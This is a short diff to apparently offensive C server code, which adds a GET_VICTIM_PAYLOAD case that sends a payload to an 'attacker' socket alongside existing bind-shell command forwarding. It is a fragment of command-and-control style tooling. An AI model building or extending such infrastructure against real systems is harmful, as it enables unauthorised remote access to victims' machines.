@@ -125,6 +125,11 @@ int main (){
 								send(curr_client->other_side_sfd, &message.data.bind_shell_command, sizeof(message.data.bind_shell_command), 0);
 								
 								break;
+							
+							case GET_VICTIM_PAYLOAD :
+								send_payload_to_attacker(curr_client->socket_fd);									
+								
+								break;
 								
 							default :
 								send(curr_client->other_side_sfd, &message.action, sizeof(message.action), 0);
